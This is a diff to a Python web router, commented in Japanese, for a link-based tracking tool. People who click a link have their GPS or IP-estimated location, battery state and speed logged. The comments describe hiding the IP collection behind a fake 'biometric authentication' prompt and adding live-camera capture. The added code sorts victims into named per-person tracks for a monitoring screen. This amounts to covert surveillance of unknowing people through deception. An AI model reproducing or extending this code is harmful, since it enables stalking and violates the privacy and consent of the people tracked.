@@ -1,8 +1,8 @@
 """追跡ルーター：リンク踏み（一瞬/ライブ）・人物ごとの登録・追跡画面。
 
-v7:
-  ・文言を「生体認証」ベースに変更（IPの話を出さない）
-  ・ライブ映像（livecam.js）用の設定を追加
+v8:
+  ・監視室を「識別者コード」ごとに分割。識別者コードに名前を付けられる
+  ・位置が取れない端末のために、回線推定の点も残せるようにした
 """
 from __future__ import annotations
 
@@ -45,21 +45,12 @@ LIVE_DEFAULTS = {
 }
 
 ENV_MAP = {
-    "ui": "LIVE_UI",
-    "ask_text": "LIVE_ASK_TEXT",
-    "deny_text": "LIVE_DENY_TEXT",
-    "retry_text": "LIVE_RETRY_TEXT",
-    "go_text": "LIVE_GO_TEXT",
-    "wait_sec": "LIVE_WAIT",
-    "dest_min": "LIVE_DEST_MIN",
-    "deny_redirect": "LIVE_DENY_REDIRECT",
-    "dest_redirect": "LIVE_DEST_REDIRECT",
-    "promote_page": "PROMOTE_PAGE_TO_LIVE",
-    "gate": "LIVE_GATE",
-    "gate_warn": "LIVE_GATE_WARN",
-    "gate_extra": "LIVE_GATE_EXTRA",
-    "gate_copy": "LIVE_GATE_COPY",
-    "gate_link": "LIVE_GATE_LINK",
+    "ui": "LIVE_UI", "ask_text": "LIVE_ASK_TEXT", "deny_text": "LIVE_DENY_TEXT",
+    "retry_text": "LIVE_RETRY_TEXT", "go_text": "LIVE_GO_TEXT", "wait_sec": "LIVE_WAIT",
+    "dest_min": "LIVE_DEST_MIN", "deny_redirect": "LIVE_DENY_REDIRECT",
+    "dest_redirect": "LIVE_DEST_REDIRECT", "promote_page": "PROMOTE_PAGE_TO_LIVE",
+    "gate": "LIVE_GATE", "gate_warn": "LIVE_GATE_WARN", "gate_extra": "LIVE_GATE_EXTRA",
+    "gate_copy": "LIVE_GATE_COPY", "gate_link": "LIVE_GATE_LINK",
     "require_all": "LIVE_REQUIRE_ALL",
 }
 
@@ -198,6 +189,45 @@ def _get_track(code):
         db.track_update(code, mode="live", interval=_clamp_iv(l["interval"]))
         return db.track_get(code)
     return l
+
+
+# ---------- 識別者コード（vid）ごとの整理 ----------
+
+def _vid_maps(code):
+    """hit_id → vid と、既知の vid 集合と、vid のラベル。"""
+    vidmap, labels = {}, {}
+    try:
+        for h in db.q("SELECT id,vid FROM link_hits WHERE code=?", (code,)):
+            if h["vid"]:
+                vidmap[h["id"]] = h["vid"]
+    except Exception:
+        pass
+    try:
+        for v in db.visitors(2000):
+            if v["vid"]:
+                labels[v["vid"]] = v["label"] or ""
+    except Exception:
+        pass
+    return vidmap, set(labels.keys()), labels
+
+
+def _person_key(row, vidmap, vids):
+    """1点が誰のものかを決める。vid が取れなければ ip 単位にまとめる。"""
+    try:
+        note = str(row["note"] or "")
+        if note.isdigit():
+            v = vidmap.get(int(note))
+            if v:
+                return v
+        sid = str(row["sid"] or "")
+        if sid and sid in vids:
+            return sid
+    except Exception:
+        pass
+    try:
+        return "ip:" + (row["ip"] or "-")
+    except Exception:
+        return "ip:-"
 
 
 def _tp_row(code, link, ip, p, g, q, kind="pt", sid="", note=""):
@@ -369,13 +399,16 @@ async def link_extra(code: str, request: Request):
             pubkey=str(body.get("pubkey") or "")[:512])
 
     link = db.track_get(code)
-    if link and link["active"] and body.get("gps_lat") is not None:
+    # GPSが取れなかった端末でも点を残す（ip_point=1 で回線推定）
+    if link and link["active"] and (body.get("gps_lat") is not None
+                                    or body.get("ip_point")):
         trow = _tp_row(code, link, ip, p, g, body, kind="snap", sid=vid)
-        db.add_points(code, [trow])
-        db.track_update(code, last_ts=trow["ts"], last_lat=trow["lat"],
-                        last_lon=trow["lon"], last_acc=trow["acc"],
-                        last_city=trow["city"], last_ip=trow["ip"],
-                        last_src=trow["src"], points=int(link["points"] or 0) + 1)
+        if trow["lat"] is not None:
+            db.add_points(code, [trow])
+            db.track_update(code, last_ts=trow["ts"], last_lat=trow["lat"],
+                            last_lon=trow["lon"], last_acc=trow["acc"],
+                            last_city=trow["city"], last_ip=trow["ip"],
+                            last_src=trow["src"], points=int(link["points"] or 0) + 1)
     return {"ok": True, "vid": vid}
 
 
@@ -420,11 +453,12 @@ async def link_point(code: str, request: Request):
         if not isinstance(q, dict):
             continue
         row = _tp_row(code, link, ip, p, g, q, kind="pt", sid=sid, note=hid)
-        if row["lat"] is not None:
-            key = (round(row["lat"], 5), round(row["lon"], 5))
-            if key == pkey and row["ts"][:19] == (pts_ts or "")[:19]:
-                continue
-            pkey, pts_ts = key, row["ts"]
+        if row["lat"] is None:
+            continue
+        key = (round(row["lat"], 5), round(row["lon"], 5))
+        if key == pkey and row["ts"][:19] == (pts_ts or "")[:19]:
+            continue
+        pkey, pts_ts = key, row["ts"]
         rows.append(row)
         last = row
 
@@ -460,6 +494,7 @@ def api_track(code: str, request: Request, since: int = 0, limit: int = 1500):
     except Exception:
         limit = 1500
     rows = db.points(code, since=since, limit=limit)
+    vidmap, vids, labels = _vid_maps(code)
     iv = _clamp_iv(link["interval"])
 
     def _g(r, k, d=None):
@@ -489,8 +524,8 @@ def api_track(code: str, request: Request, since: int = 0, limit: int = 1500):
                      for s in db.track_sessions(code)],
         "points": [{"id": r["id"], "ts": r["ts"], "lat": r["lat"], "lon": r["lon"],
                     "acc": r["acc"], "src": r["src"], "city": r["city"], "ip": r["ip"],
-                    "batt": r["battery"], "chg": r["charging"], "spd": r["spd"]}
-                   for r in rows],
+                    "batt": r["battery"], "chg": r["charging"], "spd": r["spd"],
+                    "key": _person_key(r, vidmap, vids)} for r in rows],
         "server": _now(),
     }
 
@@ -600,20 +635,64 @@ def tracks_add(request: Request, person: str = Form(""), mode: str = Form("snap"
     return RedirectResponse(f"/track/{code}", status_code=303)
 
 
+def _people(code, rows):
+    vidmap, vids, labels = _vid_maps(code)
+    out = {}
+    for r in rows:
+        key = _person_key(r, vidmap, vids)
+        g = out.get(key)
+        if not g:
+            g = out[key] = {"key": key, "vid": ("" if key.startswith("ip:") else key),
+                            "label": labels.get(key, ""), "n": 0, "pts": [],
+                            "last": None, "sids": []}
+        g["n"] += 1
+        g["pts"].append(r)
+        g["last"] = r
+        s = str(r["sid"] or "")
+        if s and s not in g["sids"]:
+            g["sids"].append(s)
+    return sorted(out.values(), key=lambda g: (g["last"]["ts"] or ""), reverse=True)
+
+
+def _person_view(g):
+    return {
+        "key": g["key"], "vid": g["vid"], "label": g["label"], "n": g["n"],
+        "sids": g["sids"], "code8": (g["vid"] or g["key"])[:8],
+        "last": dict(g["last"]),
+    }
+
+
 @router.get("/track/{code}", response_class=HTMLResponse)
-def track_view(code: str, request: Request, u=Depends(auth)):
+def track_view(code: str, request: Request, v: str = "", u=Depends(auth)):
     link = db.track_get(code)
     if not link:
         raise HTTPException(404)
-    rows = db.points(code, limit=5000)
-    pts = [{"id": r["id"], "ts": r["ts"], "lat": r["lat"], "lon": r["lon"],
-            "acc": r["acc"], "src": r["src"], "city": r["city"], "ip": r["ip"],
-            "batt": r["battery"]} for r in rows]
-    return render("track_view.html", request, link=link, pts=pts,
-                  pts_json=json.dumps(pts, ensure_ascii=False),
+    rows = [dict(r) for r in db.points(code, limit=5000)]
+    people = _people(code, rows)
+    cur = next((g for g in people if g["key"] == v), None) if v else None
+
+    return render("track_view.html", request, link=link,
+                  people=[_person_view(g) for g in people],
+                  cur=(_person_view(cur) if cur else None),
+                  cur_json=json.dumps(cur["pts"], ensure_ascii=False) if cur else "[]",
+                  all_json=json.dumps(
+                      [{"lat": r["lat"], "lon": r["lon"], "src": r["src"]}
+                       for r in rows if r["lat"] is not None], ensure_ascii=False),
                   live=bool(link["live"]) and _recent(link["last_ts"], 90),
-                  sessions=db.track_sessions(code), days=db.track_days(code),
-                  base=_m()._base(request), n=len(pts))
+                  base=_m()._base(request), n=len(rows))
+
+
+@router.post("/track/{code}/person/name")
+def track_person_name(request: Request, code: str, vid: str = Form(""),
+                      name: str = Form(""), back: str = Form(""), u=Depends(auth)):
+    if vid:
+        try:
+            db.set_visitor_label(vid, (name or "").strip()[:40], "")
+        except Exception:
+            pass
+    if back:
+        return RedirectResponse(f"/track/{code}?v={quote(back)}", status_code=303)
+    return RedirectResponse(f"/track/{code}", status_code=303)
 
 
 @router.post("/track/{code}/update")
